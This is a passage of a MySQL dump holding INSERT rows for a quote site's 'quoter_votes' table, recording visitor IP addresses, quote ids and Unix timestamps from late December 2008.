  (7000,'77.123.113.17','',0,218,1230067760);
COMMIT;

#
# Data for the `quoter_votes` table  (LIMIT 7000,500)
#

INSERT INTO `quoter_votes` (`id`, `ip`, `useragent`, `value`, `quote_id`, `created`) VALUES 
  (7001,'77.123.113.17','',0,29,1230068029),
  (7002,'77.123.113.17','',0,56,1230068091),
  (7003,'72.30.78.231','',0,245,1230068182),
  (7004,'82.193.115.138','',0,29,1230068470),
  (7005,'82.193.115.138','',0,173,1230068596),
  (7006,'85.140.64.255','',0,253,1230069445),
  (7007,'85.140.64.255','',0,252,1230069454),
  (7008,'85.140.64.255','',0,244,1230069511),
  (7009,'82.144.212.80','',0,252,1230069523),
  (7010,'85.140.64.255','',0,55,1230069612),
  (7011,'195.98.173.10','',0,215,1230069876),
  (7012,'89.138.61.205','',0,249,1230070243),
  (7013,'194.88.211.254','',0,50,1230073008),
  (7014,'72.30.78.231','',0,216,1230075096),
  (7015,'91.124.176.79','',0,254,1230075572),
  (7016,'91.124.176.79','',0,252,1230075651),
  (7017,'85.238.124.222','',0,68,1230075686),
  (7018,'85.238.124.222','',0,69,1230075709),
  (7019,'85.238.124.222','',0,66,1230075883),
  (7020,'85.238.124.222','',0,254,1230075927),
  (7021,'91.76.147.125','',0,221,1230076002),
  (7022,'91.76.147.125','',0,118,1230076019),
  (7023,'91.76.147.125','',0,23,1230076027),
  (7024,'79.135.207.175','',0,254,1230076182),
  (7025,'72.30.78.231','',0,230,1230076268),
  (7026,'91.185.50.43','',0,252,1230076759),
  (7027,'92.112.18.90','',0,254,1230076859),
  (7028,'92.112.18.90','',0,1,1230076962),
  (7029,'91.202.197.79','',0,254,1230077617),
  (7030,'91.202.197.79','',0,252,1230077646),
  (7031,'202.87.9.194','',0,251,1230077744),
  (7032,'202.87.9.194','',0,238,1230077826),
  (7033,'202.87.9.194','',0,215,1230078009),
  (7034,'89.179.12.106','',0,254,1230078202),
  (7035,'89.179.12.106','',0,250,1230078224),
  (7036,'202.87.9.194','',0,202,1230079437),
  (7037,'202.87.9.194','',0,183,1230079484),
  (7038,'202.87.9.194','',0,175,1230079545),
  (7039,'202.87.9.194','',0,129,1230079647),
  (7040,'202.87.9.194','',0,106,1230079827),
  (7041,'202.87.9.194','',0,246,1230080057),
  (7042,'80.243.71.189','',0,55,1230080150),
  (7043,'80.243.71.189','',0,1,1230080154),
  (7044,'202.87.9.194','',0,111,1230080282),
  (7045,'202.87.9.194','',0,89,1230080307),
  (7046,'77.88.30.246','',0,30,1230080879),
  (7047,'77.88.30.246','',0,236,1230080885),
  (7048,'77.88.30.246','',0,247,1230080890),
  (7049,'77.88.30.246','',0,58,1230080899),
  (7050,'77.88.30.246','',0,229,1230080904),
  (7051,'77.88.30.246','',0,235,1230080925),
  (7052,'77.88.30.246','',0,231,1230080999),
  (7053,'77.88.30.246','',0,238,1230081004),
  (7054,'77.88.30.246','',0,227,1230081009),
  (7055,'77.88.30.246','',0,233,1230081015),
  (7056,'77.88.30.246','',0,11,1230081017),
  (7057,'77.88.30.246','',0,24,1230081067),
  (7058,'77.88.30.246','',0,54,1230081072),
  (7059,'77.88.30.246','',0,61,1230081082),
  (7060,'77.88.30.246','',0,23,1230081090),
  (7061,'77.88.30.246','',0,29,1230081095),
  (7062,'77.88.30.246','',0,48,1230081131),
  (7063,'77.88.30.246','',0,13,1230081157),
  (7064,'77.88.30.246','',0,55,1230081190),
  (7065,'77.88.30.246','',0,60,1230081208),
  (7066,'77.88.30.246','',0,44,1230081220),
  (7067,'77.88.30.246','',0,9,1230081258),
  (7068,'77.88.30.246','',0,50,1230081323),
  (7069,'77.88.30.246','',0,240,1230081340),
  (7070,'77.88.30.246','',0,244,1230081345),
  (7071,'202.87.9.194','',0,255,1230081467),
  (7072,'207.67.117.177','',0,253,1230083494),
  (7073,'80.251.114.151','',0,249,1230083563),
  (7074,'207.67.117.177','',0,252,1230083783),
  (7075,'207.67.117.177','',0,251,1230084084),
  (7076,'207.67.117.177','',0,250,1230084401),
  (7077,'207.67.117.177','',0,249,1230084711),
  (7078,'207.67.117.177','',0,248,1230085165),
  (7079,'207.67.117.177','',0,247,1230085475),
  (7080,'207.67.117.177','',0,246,1230085784),
  (7081,'207.67.117.177','',0,245,1230086056),
  (7082,'207.67.117.177','',0,244,1230086434),
  (7083,'72.30.78.231','',0,177,1230090393),
  (7084,'72.30.78.231','',0,176,1230090533),
  (7085,'72.30.78.231','',0,118,1230093468),
  (7086,'65.55.105.204','',0,222,1230094130),
  (7087,'65.55.110.143','',0,222,1230094348),
  (7088,'72.30.78.231','',0,175,1230095220),
  (7089,'77.87.115.134','',0,256,1230099495),
  (7090,'93.88.5.140','',0,257,1230099580),
  (7091,'62.105.11.248','',0,257,1230099654),
  (7092,'93.88.5.140','',0,252,1230099673),
  (7093,'92.54.122.180','',0,257,1230099703),
  (7094,'72.30.78.231','',0,74,1230099773),
  (7095,'84.17.2.10','',0,257,1230100205),
  (7096,'84.17.2.10','',0,256,1230100245),
  (7097,'195.189.142.214','',0,257,1230100541),
  (7098,'62.105.11.224','',0,257,1230100756),
  (7099,'67.159.45.52','',0,257,1230100815),
  (7100,'67.159.44.138','',0,257,1230100824),
  (7101,'66.7.195.220','',0,257,1230100842),
  (7102,'91.122.30.48','',0,212,1230101029),
  (7103,'91.122.30.48','',0,171,1230101044),
  (7104,'79.171.124.210','',0,257,1230101386),
  (7105,'72.30.78.231','',0,63,1230102944),
  (7106,'79.135.207.175','',0,254,1230103223),
  (7107,'193.232.92.242','',0,256,1230105153),
  (7108,'194.106.195.106','',0,257,1230105362),
  (7109,'194.106.195.106','',0,256,1230105392),
  (7110,'194.106.195.106','',0,255,1230105425),
  (7111,'194.106.195.106','',0,254,1230105441),
  (7112,'194.106.195.106','',0,253,1230105533),
  (7113,'194.106.195.106','',0,252,1230105543),
  (7114,'194.106.195.106','',0,251,1230105569),
  (7115,'194.106.195.106','',0,250,1230105579),
  (7116,'194.106.195.106','',0,248,1230105628),
  (7117,'194.106.195.106','',0,249,1230105635),
  (7118,'92.46.47.134','',0,258,1230106359),
  (7119,'92.46.47.134','',0,55,1230106449),
  (7120,'213.180.219.135','',0,12,1230106729),
  (7121,'213.180.219.135','',0,85,1230106733),
  (7122,'213.79.112.34','',0,257,1230107318),
  (7123,'72.30.78.231','',0,96,1230107320),
  (7124,'91.203.13.34','',0,54,1230107524),
  (7125,'91.187.9.45','',0,249,1230107537),
  (7126,'91.187.9.45','',0,55,1230107711),
  (7127,'91.187.9.45','',0,109,1230107795),
  (7128,'92.46.47.134','',0,257,1230108516),
  (7129,'212.98.163.238','',0,257,1230108924),
  (7130,'212.98.163.238','',0,259,1230108950),
  (7131,'88.81.227.163','',0,259,1230109348),
  (7132,'81.26.156.31','',0,257,1230109472),
  (7133,'62.213.30.150','',0,259,1230109510),
  (7134,'62.213.30.150','',0,257,1230109523),
  (7135,'81.26.156.31','',0,252,1230109547),
  (7136,'62.213.30.150','',0,251,1230109564),
  (7137,'62.213.30.150','',0,249,1230109579),
  (7138,'62.213.30.150','',0,247,1230109587),
  (7139,'62.213.30.150','',0,246,1230109597),
  (7140,'62.213.30.150','',0,245,1230109608),
  (7141,'62.213.30.150','',0,244,1230109614),
  (7142,'62.213.30.150','',0,243,1230109636),
  (7143,'62.213.30.150','',0,241,1230109654),
  (7144,'212.14.162.147','',0,259,1230110124),
  (7145,'212.14.162.147','',0,256,1230110197),
  (7146,'213.79.90.98','',0,238,1230110239),
  (7147,'212.14.162.147','',0,253,1230110267),
  (7148,'212.14.162.147','',0,251,1230110283),
  (7149,'91.185.53.225','',0,257,1230110713),
  (7150,'72.30.78.231','',0,73,1230110850),
  (7151,'80.243.4.222','',0,257,1230111216),
  (7152,'80.243.4.222','',0,258,1230111250),
  (7153,'80.243.4.222','',0,254,1230111376),
  (7154,'80.243.4.222','',0,252,1230111388),
  (7155,'80.243.4.222','',0,250,1230111402),
  (7156,'92.46.47.134','',0,259,1230111612),
  (7157,'81.222.255.25','',0,257,1230112622),
  (7158,'81.222.255.25','',0,233,1230112711),
  (7159,'195.222.189.237','',0,251,1230112716),
  (7160,'81.222.255.25','',0,224,1230112723),
  (7161,'62.181.55.40','',0,251,1230112902),
  (7162,'81.222.82.206','',0,260,1230113557),
  (7163,'195.210.162.152','',0,257,1230113711),
  (7164,'212.14.162.147','',0,224,1230113916),
  (7165,'212.14.162.147','',0,223,1230114123),
  (7166,'212.14.162.147','',0,219,1230114172),
  (7167,'212.14.162.147','',0,214,1230114291),
  (7168,'212.14.162.147','',0,207,1230114505),
  (7169,'212.48.140.81','',0,139,1230114818),
  (7170,'212.48.140.81','',0,258,1230114829),
  (7171,'212.48.140.81','',0,133,1230114838),
  (7172,'212.48.140.81','',0,111,1230114849),
  (7173,'212.48.140.81','',0,70,1230114954),
  (7174,'212.48.140.81','',0,3,1230115024),
  (7175,'212.48.140.81','',0,257,1230115062),
  (7176,'66.249.66.47','',0,12,1230115160),
  (7177,'212.48.140.81','',0,252,1230115238),
  (7178,'212.48.140.81','',0,233,1230115316),
  (7179,'212.48.140.81','',0,222,1230115345),
  (7180,'212.48.140.81','',0,185,1230115513),
  (7181,'212.48.140.81','',0,218,1230115595),
  (7182,'212.48.140.81','',0,157,1230115682),
  (7183,'72.30.78.231','',0,87,1230115853),
  (7184,'72.30.78.231','',0,88,1230115894),
  (7185,'212.48.140.81','',0,155,1230115907),
  (7186,'212.48.140.81','',0,140,1230116108),
  (7187,'212.48.140.81','',0,124,1230116133),
  (7188,'212.48.140.81','',0,120,1230116145),
  (7189,'212.48.140.81','',0,114,1230116261),
  (7190,'66.249.66.47','',0,48,1230116335),
  (7191,'82.207.125.180','',0,260,1230116647),
  (7192,'212.48.140.81','',0,95,1230116859),
  (7193,'212.48.140.81','',0,93,1230116945),
  (7194,'87.251.89.66','',0,257,1230116989),
  (7195,'195.39.196.252','',0,29,1230117156),
  (7196,'212.48.140.81','',0,67,1230117281),
  (7197,'212.48.140.81','',0,53,1230117311),
  (7198,'212.48.140.81','',0,29,1230117375),
  (7199,'85.172.37.241','',0,257,1230117882),
  (7200,'72.30.78.231','',0,165,1230117916),
  (7201,'90.150.246.144','',0,258,1230118357),
  (7202,'66.249.66.47','',0,244,1230118428),
  (7203,'66.249.66.47','',0,236,1230119056),
  (7204,'91.202.197.79','',0,261,1230119182),
  (7205,'66.249.66.47','',0,242,1230119539),
  (7206,'66.249.66.47','',0,238,1230119627),
  (7207,'66.249.66.47','',0,243,1230119635),
  (7208,'66.249.66.47','',0,235,1230119708),
  (7209,'91.192.32.50','',0,261,1230120047),
  (7210,'91.192.32.50','',0,259,1230120078),
  (7211,'91.192.32.50','',0,254,1230120379),
  (7212,'91.192.32.50','',0,255,1230120436),
  (7213,'91.192.32.50','',0,256,1230120457),
  (7214,'91.192.32.50','',0,257,1230120517),
  (7215,'91.192.32.50','',0,258,1230120560),
  (7216,'66.249.66.47','',0,240,1230120791),
  (7217,'91.192.32.50','',0,260,1230120842),
  (7218,'66.249.66.47','',0,246,1230120951),
  (7219,'91.192.32.50','',0,249,1230121019),
  (7220,'82.207.125.180','',0,261,1230121344),
  (7221,'82.140.109.53','',0,258,1230121456),
  (7222,'66.249.66.47','',0,241,1230121460),
  (7223,'82.207.125.180','',0,248,1230121460),
  (7224,'88.84.200.17','',0,145,1230121516),
  (7225,'82.140.109.53','',0,261,1230121517),
  (7226,'66.249.66.47','',0,245,1230121643),
  (7227,'85.25.120.147','',0,55,1230121643),
  (7228,'213.33.216.246','',0,260,1230122516),
  (7229,'88.84.200.17','',0,119,1230122539),
  (7230,'88.84.200.17','',0,117,1230122819),
  (7231,'94.178.243.106','',0,257,1230122846),
  (7232,'94.178.243.106','',0,252,1230122856),
  (7233,'94.50.204.108','',0,260,1230123137),
  (7234,'94.50.204.108','',0,257,1230123155),
  (7235,'88.84.200.17','',0,104,1230123184),
  (7236,'88.84.200.17','',0,107,1230123195),
  (7237,'88.84.200.17','',0,111,1230123202),
  (7238,'85.93.35.89','',0,216,1230124065),
  (7239,'92.47.218.217','',0,258,1230124102),
  (7240,'92.47.218.217','',0,254,1230124121),
  (7241,'85.93.35.89','',0,145,1230124184),
  (7242,'85.93.35.89','',0,119,1230124197),
  (7243,'85.93.35.89','',0,56,1230124240),
  (7244,'213.33.216.246','',0,238,1230124720),
  (7245,'213.33.216.246','',0,218,1230124739),
  (7246,'88.84.200.17','',0,25,1230124886),
  (7247,'213.33.216.246','',0,55,1230125125),
  (7248,'85.141.169.214','',0,261,1230125159),
  (7249,'85.141.169.214','',0,260,1230125168),
  (7250,'85.141.169.214','',0,259,1230125178),
  (7251,'85.141.169.214','',0,258,1230125190),
  (7252,'85.141.169.214','',0,257,1230125195),
  (7253,'85.141.169.214','',0,256,1230125218),
  (7254,'85.141.169.214','',0,252,1230125258),
  (7255,'85.141.169.214','',0,244,1230125322),
  (7256,'80.255.64.44','',0,258,1230126814),
  (7257,'212.98.164.146','',0,260,1230127182),
  (7258,'80.255.64.44','',0,253,1230127206),
  (7259,'212.98.164.146','',0,259,1230127219),
  (7260,'212.98.164.146','',0,257,1230127253),
  (7261,'212.98.164.146','',0,252,1230127349),
  (7262,'212.98.164.146','',0,250,1230127626),
  (7263,'83.69.217.14','',0,55,1230127956),
  (7264,'83.69.217.14','',0,224,1230128199),
  (7265,'212.98.164.146','',0,245,1230128238),
  (7266,'212.98.164.146','',0,242,1230128260),
  (7267,'94.25.18.77','',0,261,1230128365),
  (7268,'94.25.18.77','',0,260,1230128390),
  (7269,'92.113.155.27','',0,261,1230128397),
  (7270,'94.25.18.77','',0,259,1230128410),
  (7271,'94.25.18.77','',0,258,1230128461),
  (7272,'94.25.18.77','',0,257,1230128498),
  (7273,'92.112.87.152','',0,221,1230128575),
  (7274,'84.204.148.130','',0,260,1230128759),
  (7275,'84.204.148.130','',0,259,1230128775),
  (7276,'212.98.164.146','',0,224,1230128780),
  (7277,'84.204.148.130','',0,257,1230128791),
  (7278,'84.204.148.130','',0,76,1230128862),
  (7279,'92.46.20.125','',0,261,1230129312),
  (7280,'92.46.20.125','',0,258,1230129333),
  (7281,'92.46.20.125','',0,55,1230129368),
  (7282,'72.30.78.231','',0,231,1230130514),
  (7283,'92.46.20.125','',0,221,1230131257),
  (7284,'95.24.43.250','',0,261,1230132737),
  (7285,'95.24.43.250','',0,260,1230132751),
  (7286,'194.242.119.90','',0,220,1230133511),
  (7287,'77.123.98.190','',0,258,1230134258),
  (7288,'77.123.98.190','',0,55,1230134353),
  (7289,'212.98.179.118','',0,261,1230137080),
  (7290,'212.98.179.118','',0,260,1230137138),
  (7291,'212.98.179.118','',0,259,1230137187),
  (7292,'212.98.179.118','',0,258,1230137197),
  (7293,'212.98.179.118','',0,253,1230137380),
  (7294,'72.30.142.222','',0,242,1230137409),
  (7295,'85.238.126.180','',0,254,1230137419),
  (7296,'85.238.126.180','',0,66,1230137450),
  (7297,'212.98.179.118','',0,250,1230137464),
  (7298,'85.238.126.180','',0,68,1230137479),
  (7299,'212.98.179.118','',0,247,1230137499),
  (7300,'85.238.126.180','',0,69,1230137544),
  (7301,'212.98.179.118','',0,218,1230137615),
  (7302,'212.98.179.118','',0,208,1230137628),
  (7303,'77.35.17.57','',0,249,1230138127),
  (7304,'77.35.17.57','',0,221,1230138268),
  (7305,'72.30.142.222','',0,44,1230138631),
  (7306,'80.243.4.222','',0,265,1230138774),
  (7307,'86.57.197.179','',0,55,1230138790),
  (7308,'80.243.4.222','',0,263,1230138790),
  (7309,'80.243.4.222','',0,264,1230138800),
  (7310,'80.243.4.222','',0,261,1230138809),
  (7311,'80.243.4.222','',0,260,1230138817),
  (7312,'80.243.4.222','',0,259,1230138830),
  (7313,'80.243.4.222','',0,258,1230138837),
  (7314,'80.243.4.222','',0,262,1230138864),
  (7315,'80.243.4.222','',0,253,1230138905),
  (7316,'91.185.54.125','',0,265,1230138911),
  (7317,'92.46.20.125','',0,257,1230139349),
  (7318,'92.46.20.125','',0,260,1230139356),
  (7319,'72.30.142.222','',0,89,1230139970),
  (7320,'77.122.222.211','',0,197,1230141197),
  (7321,'77.122.222.211','',0,195,1230141200),
  (7322,'77.122.222.211','',0,266,1230141328),
  (7323,'212.98.179.118','',0,266,1230141334),
  (7324,'212.98.179.118','',0,265,1230141357),
  (7325,'212.98.179.118','',0,264,1230141377),
  (7326,'91.144.145.5','',0,266,1230141430),
  (7327,'79.171.124.210','',0,171,1230141507),
  (7328,'94.178.212.64','',0,221,1230141524),
  (7329,'79.165.45.16','',0,267,1230141636),
  (7330,'79.165.45.16','',0,266,1230141651),
  (7331,'94.178.212.64','',0,266,1230141721),
  (7332,'94.178.212.64','',0,267,1230141723),
  (7333,'79.165.45.16','',0,261,1230141734),
  (7334,'79.165.45.16','',0,260,1230141744),
  (7335,'91.202.71.249','',0,268,1230141788),
  (7336,'79.171.124.210','',0,268,1230141868),
  (7337,'79.171.124.210','',0,267,1230141880),
  (7338,'79.171.124.210','',0,265,1230141926),
  (7339,'79.171.124.210','',0,255,1230142038),
  (7340,'94.178.212.64','',0,259,1230142057),
  (7341,'77.122.222.211','',0,267,1230142226),
  (7342,'93.183.245.174','',0,222,1230142437),
  (7343,'93.183.245.174','',0,218,1230142507),
  (7344,'93.183.245.174','',0,212,1230142568),
  (7345,'79.171.124.210','',0,261,1230142631),
  (7346,'93.183.245.174','',0,206,1230142676),
  (7347,'77.122.222.211','',0,269,1230143041),
  (7348,'92.100.54.98','',0,268,1230143138),
  (7349,'92.100.54.98','',0,266,1230143159),
  (7350,'77.122.222.211','',0,257,1230143178),
  (7351,'94.178.212.64','',0,270,1230143204),
  (7352,'92.100.54.98','',0,261,1230143283),
  (7353,'92.100.54.98','',0,260,1230143308),
  (7354,'94.178.212.64','',0,133,1230143344),
  (7355,'77.122.222.211','',0,270,1230143420),
  (7356,'94.178.212.64','',0,269,1230143527),
  (7357,'72.30.142.222','',0,138,1230143607),
  (7358,'77.122.222.211','',0,271,1230143705),
  (7359,'94.178.212.64','',0,268,1230144008),
  (7360,'93.183.245.174','',0,180,1230144036),
  (7361,'79.171.124.210','',0,271,1230144048),
  (7362,'93.183.245.174','',0,133,1230144259),
  (7363,'93.183.245.174','',0,124,1230144367),
  (7364,'93.183.245.174','',0,117,1230144406),
  (7365,'93.183.245.174','',0,104,1230144679),
  (7366,'193.19.206.251','',0,267,1230145274),
  (7367,'193.19.206.251','',0,269,1230145280),
  (7368,'193.19.206.251','',0,270,1230145286),
  (7369,'193.19.206.251','',0,271,1230145294),
  (7370,'78.37.127.175','',0,171,1230146672),
  (7371,'78.37.127.175','',0,212,1230146675),
  (7372,'91.149.133.122','',0,271,1230147012),
  (7373,'91.149.133.122','',0,270,1230147024),
  (7374,'91.149.133.122','',0,269,1230147031),
  (7375,'91.149.133.122','',0,268,1230147057),
  (7376,'91.149.133.122','',0,264,1230147083),
  (7377,'92.242.21.227','',0,271,1230147086),
  (7378,'91.149.133.122','',0,254,1230147137),
  (7379,'62.221.107.156','',0,272,1230147225),
  (7380,'62.221.107.156','',0,271,1230147230),
  (7381,'62.221.107.156','',0,270,1230147247),
  (7382,'62.221.107.156','',0,269,1230147266),
  (7383,'62.221.107.156','',0,268,1230147277),
  (7384,'62.221.107.156','',0,267,1230147288),
  (7385,'62.221.107.156','',0,266,1230147300),
  (7386,'62.221.107.156','',0,264,1230147332),
  (7387,'64.1.215.165','',0,253,1230147351),
  (7388,'72.30.142.222','',0,270,1230147667),
  (7389,'77.120.80.252','',0,271,1230147796),
  (7390,'77.120.80.252','',0,270,1230147809),
  (7391,'77.120.80.252','',0,269,1230147832),
  (7392,'77.120.80.252','',0,268,1230147853),
  (7393,'77.120.80.252','',0,267,1230147860),
  (7394,'77.120.80.252','',0,266,1230147869),
  (7395,'77.120.80.252','',0,264,1230147908),
  (7396,'77.120.80.252','',0,263,1230147945),
  (7397,'77.120.80.252','',0,261,1230147964),
  (7398,'77.120.80.252','',0,258,1230147995),
  (7399,'77.120.80.252','',0,180,1230148050),
  (7400,'77.120.80.252','',0,163,1230148059),
  (7401,'77.120.80.252','',0,143,1230148087),
  (7402,'95.24.43.250','',0,271,1230148089),
  (7403,'77.120.80.252','',0,111,1230148124),
  (7404,'77.120.80.252','',0,215,1230148264),
  (7405,'72.30.142.222','',0,269,1230148506),
  (7406,'92.46.20.125','',0,271,1230148540),
  (7407,'92.46.20.125','',0,268,1230148601),
  (7408,'92.46.20.125','',0,267,1230148608),
  (7409,'92.46.20.125','',0,266,1230148615),
  (7410,'85.238.124.28','',0,29,1230151396),
  (7411,'85.238.124.28','',0,259,1230151404),
  (7412,'95.52.16.116','',0,271,1230151504),
  (7413,'95.52.16.116','',0,270,1230151526),
  (7414,'95.52.16.116','',0,269,1230151543),
  (7415,'95.52.16.116','',0,268,1230151558),
  (7416,'95.52.16.116','',0,265,1230151582),
  (7417,'95.52.16.116','',0,261,1230151727),
  (7418,'95.52.16.116','',0,257,1230151769),
  (7419,'72.30.142.222','',0,256,1230151818),
  (7420,'194.88.211.254','',0,271,1230152608),
  (7421,'194.88.211.254','',0,50,1230152676),
  (7422,'94.253.25.76','',0,273,1230153013),
  (7423,'72.30.142.222','',0,243,1230153097),
  (7424,'94.253.25.76','',0,271,1230153099),
  (7425,'94.253.25.76','',0,270,1230153101),
  (7426,'94.253.25.76','',0,263,1230153117),
  (7427,'72.30.142.222','',0,240,1230153518),
  (7428,'89.189.19.22','',0,273,1230153583),
  (7429,'89.189.19.22','',0,272,1230153735),
  (7430,'89.189.19.22','',0,271,1230153739),
  (7431,'89.189.19.22','',0,270,1230153766),
  (7432,'89.189.19.22','',0,269,1230153798),
  (7433,'89.189.19.22','',0,268,1230153818),
  (7434,'89.189.19.22','',0,267,1230153838),
  (7435,'89.189.19.22','',0,266,1230153846),
  (7436,'72.30.142.222','',0,130,1230153882),
  (7437,'89.189.19.22','',0,265,1230153884),
  (7438,'72.30.142.222','',0,85,1230154013),
  (7439,'193.19.206.251','',0,270,1230154532),
  (7440,'193.19.206.251','',0,269,1230154541),
  (7441,'193.19.206.251','',0,268,1230154550),
  (7442,'193.19.206.251','',0,267,1230154552),
  (7443,'193.19.206.251','',0,266,1230154561),
  (7444,'193.19.206.251','',0,264,1230154579),
  (7445,'72.30.142.222','',0,12,1230155501),
  (7446,'89.138.61.205','',0,266,1230155943),
  (7447,'94.253.50.130','',0,271,1230157729),
  (7448,'94.253.50.130','',0,270,1230157744),
  (7449,'94.253.50.130','',0,269,1230157749),
  (7450,'94.253.50.130','',0,267,1230157765),
  (7451,'94.253.50.130','',0,268,1230157766),
  (7452,'94.253.50.130','',0,266,1230157769),
  (7453,'72.30.142.222','',0,173,1230159063),
  (7454,'72.30.142.222','',0,152,1230160169),
  (7455,'89.189.19.22','',0,260,1230160326),
  (7456,'72.30.142.222','',0,185,1230160368),
  (7457,'89.189.19.22','',0,247,1230160448),
  (7458,'92.113.76.221','',0,270,1230160479),
  (7459,'89.189.19.22','',0,235,1230160483),
  (7460,'91.185.54.125','',0,271,1230160558),
  (7461,'64.1.215.165','',0,259,1230160609),
  (7462,'91.185.54.125','',0,269,1230160704),
  (7463,'91.185.54.125','',0,268,1230160709),
  (7464,'91.185.54.125','',0,267,1230160718),
  (7465,'91.185.54.125','',0,266,1230160720),
  (7466,'89.189.19.22','',0,212,1230160972),
  (7467,'89.189.19.22','',0,213,1230160994),
  (7468,'72.30.142.222','',0,133,1230161304),
  (7469,'156.17.237.13','',0,271,1230161437),
  (7470,'156.17.237.13','',0,268,1230161482),
  (7471,'156.17.237.13','',0,267,1230161485),
  (7472,'156.17.237.13','',0,266,1230161490),
  (7473,'156.17.237.13','',0,265,1230161511),
  (7474,'156.17.237.13','',0,264,1230161524),
  (7475,'72.30.142.222','',0,125,1230162689),
  (7476,'72.30.142.222','',0,255,1230162749),
  (7477,'80.243.71.189','',0,55,1230163388),
  (7478,'80.243.71.189','',0,1,1230163389),
  (7479,'72.30.142.222','',0,254,1230164822),
  (7480,'72.30.142.222','',0,55,1230166599),
  (7481,'77.88.30.246','',0,76,1230167206),
  (7482,'77.88.30.246','',0,241,1230167223),
  (7483,'77.88.30.246','',0,246,1230167236),
  (7484,'77.88.30.246','',0,251,1230167249),
  (7485,'77.88.30.246','',0,242,1230167268),
  (7486,'77.88.30.246','',0,73,1230167281),
  (7487,'77.88.30.246','',0,254,1230167366),
  (7488,'77.88.30.246','',0,79,1230167387),
  (7489,'77.88.30.246','',0,77,1230167409),
  (7490,'77.88.30.246','',0,245,1230167541),
  (7491,'77.88.30.246','',0,75,1230167564),
  (7492,'77.88.30.246','',0,250,1230167628),
  (7493,'77.88.30.246','',0,243,1230167671),
  (7494,'77.88.30.246','',0,253,1230167675),
  (7495,'77.88.30.246','',0,248,1230167685),
  (7496,'77.88.30.246','',0,249,1230167702),
  (7497,'72.30.142.222','',0,99,1230171169),
  (7498,'80.243.71.189','',0,272,1230171709),
  (7499,'80.243.71.189','',0,271,1230171715),
  (7500,'80.243.71.189','',0,269,1230171749);
COMMIT;

#
# Data for the `quoter_votes` table  (LIMIT 7500,500)
#

INSERT INTO `quoter_votes` (`id`, `ip`, `useragent`, `value`, `quote_id`, `created`) VALUES 
  (7501,'80.243.71.189','',0,266,1230171762),
  (7502,'80.243.71.189','',0,267,1230171763),
  (7503,'80.243.71.189','',0,268,1230171764),
  (7504,'80.243.71.189','',0,265,1230171772),
  (7505,'80.243.71.189','',0,264,1230171776),
  (7506,'80.243.71.189','',0,262,1230171799),
  (7507,'80.243.71.189','',0,261,1230171802),
  (7508,'80.243.71.189','',0,260,1230171813),
  (7509,'77.120.196.25','',0,268,1230171939),
  (7510,'72.30.142.222','',0,180,1230172071),
  (7511,'195.72.159.213','',0,109,1230172334),
  (7512,'195.72.159.213','',0,93,1230172614),
  (7513,'77.120.196.25','',0,259,1230176812),
  (7514,'72.30.142.222','',0,173,1230176914),
  (7515,'92.46.47.134','',0,258,1230177066),
  (7516,'72.30.142.222','',0,189,1230177564),
  (7517,'213.232.95.151','',0,256,1230179069),
  (7518,'213.79.108.6','',0,212,1230179591),
  (7519,'193.238.153.30','',0,269,1230179647),
  (7520,'213.79.108.6','',0,119,1230179848),
  (7521,'72.30.142.222','',0,172,1230179919),
  (7522,'193.238.153.30','',0,29,1230179944),
  (7523,'72.30.142.222','',0,246,1230181919),
  (7524,'92.46.47.134','',0,55,1230182246),
  (7525,'72.30.142.222','',0,77,1230182351),
  (7526,'84.17.2.10','',0,272,1230183691),
  (7527,'84.17.2.10','',0,270,1230183708),
  (7528,'84.17.2.10','',0,265,1230183752),
  (7529,'84.17.2.10','',0,264,1230183771),
  (7530,'84.17.2.10','',0,263,1230183786),
  (7531,'84.17.2.10','',0,262,1230183813),
  (7532,'84.17.2.10','',0,259,1230183831),
  (7533,'84.17.2.10','',0,258,1230183842),
  (7534,'174.36.207.234','',0,273,1230185905),
  (7535,'174.36.207.234','',0,272,1230185912),
  (7536,'174.36.207.234','',0,270,1230185921),
  (7537,'174.36.207.234','',0,269,1230185932),
  (7538,'174.36.207.234','',0,265,1230185939),
  (7539,'174.36.207.234','',0,264,1230185948),
  (7540,'174.36.207.234','',0,263,1230185956),
  (7541,'174.36.207.234','',0,262,1230185963),
  (7542,'174.36.207.234','',0,259,1230185969),
  (7543,'174.36.207.234','',0,258,1230185981),
  (7544,'174.36.207.234','',0,254,1230186047),
  (7545,'174.36.207.234','',0,250,1230186058),
  (7546,'174.36.207.234','',0,242,1230186070),
  (7547,'174.36.207.234','',0,248,1230186105),
  (7548,'174.36.207.234','',0,247,1230186112),
  (7549,'174.36.207.234','',0,235,1230186122),
  (7550,'174.36.207.234','',0,227,1230186129),
  (7551,'174.36.207.234','',0,216,1230186139),
  (7552,'174.36.207.234','',0,215,1230186146),
  (7553,'174.36.207.234','',0,213,1230186153),
  (7554,'174.36.207.234','',0,212,1230186162),
  (7555,'174.36.207.234','',0,171,1230186176),
  (7556,'174.36.207.234','',0,165,1230186189),
  (7557,'174.36.207.234','',0,255,1230186217),
  (7558,'174.36.207.234','',0,251,1230186232),
  (7559,'174.36.207.234','',0,241,1230186245),
  (7560,'174.36.207.234','',0,240,1230186257),
  (7561,'174.36.207.234','',0,223,1230186265),
  (7562,'174.36.207.234','',0,214,1230186278),
  (7563,'174.36.207.234','',0,202,1230186308),
  (7564,'174.36.207.234','',0,190,1230186319),
  (7565,'174.36.207.234','',0,183,1230186346),
  (7566,'174.36.207.234','',0,178,1230186368),
  (7567,'174.36.207.234','',0,249,1230186387),
  (7568,'174.36.207.234','',0,231,1230186401),
  (7569,'174.36.207.234','',0,230,1230186412),
  (7570,'174.36.207.234','',0,220,1230186424),
  (7571,'174.36.207.234','',0,207,1230186433),
  (7572,'174.36.207.234','',0,205,1230186452),
  (7573,'174.36.207.234','',0,184,1230186462),
  (7574,'174.36.207.234','',0,128,1230186470),
  (7575,'174.36.207.234','',0,108,1230186478),
  (7576,'174.36.207.234','',0,94,1230186490),
  (7577,'174.36.207.234','',0,246,1230186508),
  (7578,'174.36.207.234','',0,180,1230186516),
  (7579,'174.36.207.234','',0,163,1230186523),
  (7580,'174.36.207.234','',0,143,1230186530),
  (7581,'174.36.207.234','',0,139,1230186538),
  (7582,'174.36.207.234','',0,133,1230186547),
  (7583,'174.36.207.234','',0,111,1230186553),
  (7584,'174.36.207.234','',0,89,1230186559),
  (7585,'174.36.207.234','',0,77,1230186565),
  (7586,'174.36.207.234','',0,256,1230186580),
  (7587,'174.36.207.234','',0,243,1230186585),
  (7588,'174.36.207.234','',0,234,1230186591),
  (7589,'174.36.207.234','',0,229,1230186602),
  (7590,'174.36.207.234','',0,203,1230186614),
  (7591,'174.36.207.234','',0,147,1230186622),
